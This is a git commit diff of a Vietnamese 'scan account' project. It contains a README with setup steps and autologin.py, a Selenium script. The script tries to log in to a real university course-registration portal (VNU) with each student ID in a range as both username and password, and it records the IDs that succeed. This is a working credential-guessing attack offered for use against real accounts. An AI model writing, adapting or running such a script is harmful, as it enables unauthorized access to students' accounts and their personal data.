9249a7d6b8b89a1de345f21a14fcadf2652437cb
h3d-longnsp <hydroxyzine@metacity.email>
2023-08-24 19:05:07 +0700

    Update README. Add `requirements.txt`.

--- scan account/README.md
+++ scan account/README.md
@@ -1,5 +1,11 @@
-* 1.cài đặt python 
-* 2.cài đặt thư viện selenium : pip install selenium
-* 3.Cài đặt chome và tải file chromedriver.exe (lưu í version của Chome chạy trên máy và bản driver phải cùng 1 version vd : C:\Program Files\Google\Chrome\Application\109.0.5414.120 => tải version 109.xxx) : https://chromedriver.chromium.org/downloads
-* 4.Chuyển file vừa tải về vào thư mục python C:\Python310\Scripts
-* 5.cd tới thư mục chứa code và gõ : python autologin.py và kiếm tra thành quả thôi :D
+# Windows
+- Cài đặt Python 3.10.12
+- Cài đặt requirements: `pip install -r requirements.txt`
+- Cài đặt Chrome và tải file `chromedriver.exe` (lưu ý version của Chrome chạy trên máy và bản driver phải cùng 1 version vd : C:\Program Files\Google\Chrome\Application\109.0.5414.120 => tải version 109.xxx) : https://chromedriver.chromium.org/downloads
+- Chuyển file vừa tải về vào thư mục Python C:\Python310\Scripts
+- cd tới thư mục chứa code và gõ : `python autologin.py`` và kiếm tra thành quả thôi :D
+
+# Linux
+- Cài đặt requirements: `pip install -r requirements.txt`
+- `python autologin.py`
+
--- scan account/autologin.py
+++ scan account/autologin.py
@@ -1,69 +1,67 @@
-from selenium import  webdriver
-from time import sleep
-from selenium.webdriver.common.keys import Keys
+from selenium import webdriver
 from selenium.webdriver.common.by import By
-#khai bao bien browser
+from selenium.webdriver.common.keys import Keys
 
+# khai bao bien browser
 options = webdriver.ChromeOptions()
-
 options.add_experimental_option("detach", True)
 
 count = 0
-f = open("result.txt", "a")
+f = open("1900.txt", "a")
 
 # nhập khoảng msv cần check
-for x in range(20000000,20000150):
-
-    if(count==0):
+for x in range(19000000, 19002500):
+    if count == 0:
         browser = webdriver.Chrome(options=options)
         browser.get("https://daotao.vnu.edu.vn/dkmh/login.asp")
-        username = browser.find_element(By.ID,"txtLoginId")
+        username = browser.find_element(By.ID, "txtLoginId")
         username.send_keys(x)
 
-        password = browser.find_element(By.ID,"txtPassword")
+        password = browser.find_element(By.ID, "txtPassword")
         password.send_keys(x)
 
         password.send_keys(Keys.ENTER)
         url = browser.current_url
-        if(url=="https://daotao.vnu.edu.vn/dkmh/login.asp?errlogin=err"):
-            print("login fail")
+        if url == "https://daotao.vnu.edu.vn/dkmh/login.asp?errlogin=err":
+            print("login fail " + str(x))
             count = count + 1
         else:
-            f.write(str(x)+"\n")
+            f.write(str(x) + "\n")
             count = 0
             browser.close()
 
-    elif(count>=30):
-        username = browser.find_element(By.ID,"txtLoginId")
+    elif count >= 30:
+        username = browser.find_element(By.ID, "txtLoginId")
         username.send_keys(x)
 
-        password = browser.find_element(By.ID,"txtPassword")
+        password = browser.find_element(By.ID, "txtPassword")
         password.send_keys(x)
 
         password.send_keys(Keys.ENTER)
         url = browser.current_url
-        if(url=="https://daotao.vnu.edu.vn/dkmh/login.asp?errlogin=err"):
-            print("login fail")
+        if url == "https://daotao.vnu.edu.vn/dkmh/login.asp?errlogin=err":
+            print("login fail " + str(x))
         else:
-            f.write(str(x)+"\n")
+            f.write(str(x) + "\n")
         print("reload")
         count = 0
         browser.close()
-   
+
     else:
-        username = browser.find_element(By.ID,"txtLoginId")
+        username = browser.find_element(By.ID, "txtLoginId")
         username.send_keys(x)
 
-        password = browser.find_element(By.ID,"txtPassword")
+        password = browser.find_element(By.ID, "txtPassword")
         password.send_keys(x)
 
         password.send_keys(Keys.ENTER)
         url = browser.current_url
-        if(url=="https://daotao.vnu.edu.vn/dkmh/login.asp?errlogin=err"):
-            print("login fail")
+        if url == "https://daotao.vnu.edu.vn/dkmh/login.asp?errlogin=err":
+            print("login fail " + str(x))
             count = count + 1
         else:
-            f.write(str(x)+"\n")
+            f.write(str(x) + "\n")
             count = 0
             browser.close()
 f.close()
+print("done")
